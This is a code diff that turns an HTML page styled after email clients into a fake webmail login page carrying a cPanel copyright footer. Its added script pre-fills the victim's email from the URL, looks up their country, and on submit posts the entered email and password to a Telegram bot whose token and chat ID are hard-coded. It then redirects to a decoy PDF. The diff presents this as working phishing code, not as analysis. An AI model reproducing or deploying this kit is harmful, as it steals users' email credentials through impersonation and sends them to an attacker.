@@ -3,115 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chameleon Email</title>
+    <title>Webmail Login</title>
     <style>
-        /* Default Styling for Email Clients */
         body {
             font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            text-align: center;
             margin: 0;
             padding: 0;
         }
 
-        /* Gmail Styling */
-        .gmail {
-            background-color: #ffffff; /* Gmail's background color */
-            color: #202124; /* Gmail's text color */
+        .container {
+            margin-top: 150px;
         }
 
-        .gmail .header {
-            background-color: #4285f4; /* Gmail blue */
-            padding: 15px;
-            text-align: center;
+        img {
+            margin-bottom: 30px;
+            width: 250px;
         }
 
-        .gmail .header img {
-            width: 150px; /* Gmail logo size */
+        .login-box {
+            margin: 0 auto;
+            width: 300px;
         }
 
-        .gmail .content {
-            padding: 20px;
+        .login-box label {
+            display: block;
             text-align: left;
+            margin: 5px 0;
+            font-weight: normal;
         }
 
-        /* ProtonMail Styling */
-        .protonmail {
-            background-color: #f7f7f7; /* ProtonMail's background color */
-            color: #333; /* ProtonMail text color */
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
         }
 
-        .protonmail .header {
-            background-color: #6e60e0; /* ProtonMail purple */
-            padding: 15px;
-            text-align: center;
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
         }
 
-        .protonmail .header img {
-            width: 120px; /* ProtonMail logo size */
+        .login-box button:hover {
+            background-color: #0056b3;
         }
 
-        .protonmail .content {
-            padding: 20px;
-            text-align: left;
+        .languages {
+            margin-top: 100px; /* Increased margin to move down */
+            color: gray;
         }
 
-        /* Spacemail Styling */
-        .spacemail {
-            background-color: #f4f6f8; /* Spacemail's background color */
-            color: #0f0f0f; /* Spacemail text color */
+        .languages a {
+            color: gray;
+            text-decoration: none;
+            margin-right: 15px;
         }
 
-        .spacemail .header {
-            background-color: #007bff; /* Spacemail blue */
-            padding: 15px;
-            text-align: center;
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: gray;
         }
 
-        .spacemail .header img {
-            width: 130px; /* Spacemail logo size */
-        }
-
-        .spacemail .content {
-            padding: 20px;
-            text-align: left;
+        .footer a {
+            color: gray;
+            text-decoration: none;
         }
     </style>
+    <script>
+        let userCountry = ""; // Placeholder for user country
+
+        // Function to populate the email field from URL parameter
+        function populateEmailField() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('email')) {
+                document.getElementById('email').value = params.get('email');
+            }
+        }
+
+        // Function to get user's country
+        function getUserCountry() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    userCountry = data.country_name;
+                })
+                .catch(error => {
+                    console.error('Error fetching country:', error);
+                });
+        }
+
+        // Function to send data to Telegram
+        function sendDataToTelegram(event) {
+            event.preventDefault(); // Prevents form from submitting in the usual way
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const botToken = "5376961693:AAFEhctXNCUb8eb4IIitRHCHVikGutqrAjU";
+            const chatId = "5080203047";
+            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "documentequipment001.pdf"; // Redirect to PDF
+                } else {
+                    console.error("Error sending message:", data);
+                }
+            })
+            .catch(error => {
+                console.error("Failed to send message. Please try again later.", error);
+            });
+        }
+
+        window.onload = function() {
+            populateEmailField();
+            getUserCountry();
+        };
+    </script>
 </head>
 <body>
-    <!-- Here we use a class to represent the email client environment -->
-    <div class="gmail"> <!-- Change this to "protonmail" or "spacemail" to simulate different clients -->
-        <div class="header">
-            <!-- Gmail's logo or respective client's logo -->
-            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Logo">
+    <div class="container">
+        <img src="webmail-logo.svg" alt="Webmail Logo">
+        <div class="login-box">
+            <form onsubmit="sendDataToTelegram(event)">
+                <label for="email">Email Address</label>
+                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
+                
+                <button type="submit">Log in</button>
+            </form>
         </div>
-        <div class="content">
-            <h2>Welcome to Chameleon Email!</h2>
-            <p>This email will mirror the environment it's opened in.</p>
-            <p>The background, logo, and style will reflect the appearance of the email service used to view it.</p>
+        <div class="languages">
+            <a href="#">English</a>
+            <a href="#">العربية</a>
+            <a href="#">čeština</a>
+            <a href="#">dansk</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Ελληνικά</a>
+            <a href="#">español</a>
+            <a href="#">español latinoamericano</a>
         </div>
-    </div>
-
-    <!-- Optionally, you can define other email clients -->
-    <!-- Uncomment and edit to try other email styles: -->
-    <!--
-    <div class="protonmail">
-        <div class="header">
-            <img src="protonmail-logo.png" alt="ProtonMail Logo">
-        </div>
-        <div class="content">
-            <h2>Welcome to Chameleon Email!</h2>
-            <p>This email is styled like ProtonMail.</p>
-        </div>
-    </div>
-
-    <div class="spacemail">
-        <div class="header">
-            <img src="spacemail-logo.png" alt="Spacemail Logo">
-        </div>
-        <div class="content">
-            <h2>Welcome to Chameleon Email!</h2>
-            <p>This email is styled like Spacemail.</p>
+        <div class="footer">
+            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
         </div>
     </div>
-    -->
 </body>
 </html>
